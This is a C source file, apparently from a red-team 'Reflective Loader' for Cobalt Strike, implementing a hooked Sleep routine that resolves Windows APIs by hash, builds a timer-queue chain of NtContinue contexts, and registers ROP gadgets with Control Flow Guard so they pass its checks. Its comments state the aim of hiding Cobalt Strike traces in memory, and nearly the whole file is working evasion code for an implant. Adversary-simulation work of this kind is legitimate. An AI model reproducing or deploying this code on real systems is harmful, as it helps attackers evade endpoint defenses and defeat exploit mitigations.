/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

NTSTATUS
NTAPI
RtlCreateTimerQueue(
	_In_ PHANDLE NewTimerQueue
);

typedef struct
{
	D_API( NtSignalAndWaitForSingleObject );
	D_API( SetProcessValidCallTargets );
	D_API( LdrGetProcedureAddress );
	D_API( NtWaitForSingleObject );
	D_API( RtlInitUnicodeString );
	D_API( RtlCreateTimerQueue );
	D_API( WaitForSingleObject );
	D_API( RtlDeleteTimerQueue );
	D_API( RtlCaptureContext );
	D_API( RtlInitAnsiString );
	D_API( RtlAllocateHeap );
	D_API( VirtualProtect );
	D_API( RtlCreateTimer );
	D_API( NtCreateEvent );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
	D_API( NtContinue );
	D_API( SetEvent );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_NTSIGNALANDWAITFORSINGLEOBJECT	0x78983aed /* NtSignalAndWaitForSingleObject */
#define H_API_SETPROCESSVALIDCALLTARGETS	0x647d9236 /* SetProcessValidCallTargets */
#define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_NTWAITFORSINGLEOBJECT		0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLCREATETIMERQUEUE		0x50ef3c31 /* RtlCreateTimerQueue */
#define H_API_RTLDELETETIMERQUEUE		0xeec188b0 /* RtlDeleteTimerQueue */
#define H_API_WAITFORSINGLEOBJECT		0x0df1b3da /* WaitForSingleObject */
#define H_API_RTLCAPTURECONTEXT			0xeba8d910 /* RtlCaptureContext */
#define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLCREATETIMER			0x1877faec /* RtlCreateTimer */
#define H_API_NTCREATEEVENT			0x28d3233d /* NtCreateEvent */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_API_NTCONTINUE			0xfc3a6c2c /* NtContinue */
#define H_API_SETEVENT				0x9d7ff713 /* SetEvent */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_KERNELBASE			0x03ebb38b /* kernelbase.dll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Adds a ROP gadget to the CFG exception lsit to
 * permit ROP gadgets from being marked as an
 * invalid target.
 *
!*/
D_SEC( D ) VOID CfgEnableFunc( _In_ PVOID ImageBase, _In_ PVOID Function )
{
	API			Api;
	CFG_CALL_TARGET_INFO	Cfg;

	SIZE_T			Len = 0;

	PVOID			Kbs = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );

	Dos = C_PTR( ImageBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Len = U_PTR( ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );

	if ( ( Kbs = PebGetModule( H_LIB_KERNELBASE ) ) != NULL ) {
		Api.SetProcessValidCallTargets = PeGetFuncEat( Kbs, H_API_SETPROCESSVALIDCALLTARGETS );

		if ( Api.SetProcessValidCallTargets != NULL ) {
			Cfg.Flags  = CFG_CALL_TARGET_VALID;
			Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

			Api.SetProcessValidCallTargets( NtCurrentProcess(), Dos, Len, 1, &Cfg );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );
};

/*!
 *
 * Purpose:
 *
 * Uses NightHawk's Obfuscate/Sleep implementation to
 * hide traces of Cobalt Strike in memory. Temporary 
 * version, limited to x86_64 currently.
 *
!*/
D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
{
	API		Api;
	CONTEXT		Ctx;
	UNICODE_STRING	Uni;

	DWORD		Del = 0;

	PVOID		Ev1 = NULL;
	PVOID		Ev2 = NULL;
	PVOID		Ev3 = NULL;
	PVOID		K32 = NULL;
	PVOID		Tmr = NULL;
	PVOID		Que = NULL;
	PCONTEXT	Beg = NULL;
	PCONTEXT	End = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
	Api.LdrGetProcedureAddress         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.NtWaitForSingleObject          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlInitUnicodeString           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
	Api.RtlCreateTimerQueue            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
	Api.RtlDeleteTimerQueue            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDELETETIMERQUEUE );
	Api.RtlCaptureContext              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.RtlInitAnsiString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.RtlAllocateHeap                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlCreateTimer                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMER );
	Api.NtCreateEvent                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.LdrUnloadDll                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtContinue                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Load kernel32.dll if it somehow isnt already! */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );
	
	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {

		Api.WaitForSingleObject = PeGetFuncEat( K32, H_API_WAITFORSINGLEOBJECT ); 
		Api.SetEvent            = PeGetFuncEat( K32, H_API_SETEVENT );

		do {
			if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev1, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
				/* Abort! */
				break;
			};
			if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev2, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
				/* Abort! */
				break;
			};
			if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev3, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
				/* Abort! */
				break;
			};

			if ( NT_SUCCESS( Api.RtlCreateTimerQueue( &Que ) ) ) {

				Ctx.ContextFlags = CONTEXT_FULL;

				if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.RtlCaptureContext, &Ctx, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
					if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.SetEvent, Ev1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
						if ( NT_SUCCESS( Api.NtWaitForSingleObject( Ev1, FALSE, NULL ) ) ) {
							if ( !( Beg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};
							if ( !( End = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
								/* Abort! */
								break;
							};

							CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );

						#if defined( _WIN64 )
							__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
							Beg->ContextFlags = CONTEXT_FULL;
							Beg->Rip  = U_PTR( Api.WaitForSingleObject );
							Beg->Rsp -= sizeof( PVOID );
							Beg->Rcx  = U_PTR( Ev2 );
							Beg->Rdx  = U_PTR( INFINITE );

							__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
							End->ContextFlags = CONTEXT_FULL;
							End->Rip  = U_PTR( Api.SetEvent );
							End->Rsp -= sizeof( PVOID );
							End->Rcx  = U_PTR( Ev3 );
						#endif

							if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Beg, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
							if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;

							/* Execute and await the frame results! */
							Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
						};
					};
				};
			};
		} while ( 0 );

		if ( Ev1 != NULL ) {
			Api.NtClose( Ev1 );
		};
		if ( Ev2 != NULL ) {
			Api.NtClose( Ev2 );
		};
		if ( Ev3 != NULL ) {
			Api.NtClose( Ev3 );
		};
		if ( Que != NULL ) {
			Api.RtlDeleteTimerQueue( Que ); 
		};
		if ( Beg != NULL ) {
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Beg );
		};
		if ( End != NULL ) {
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
		};

		/* Dereference */
		Api.LdrUnloadDll( K32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
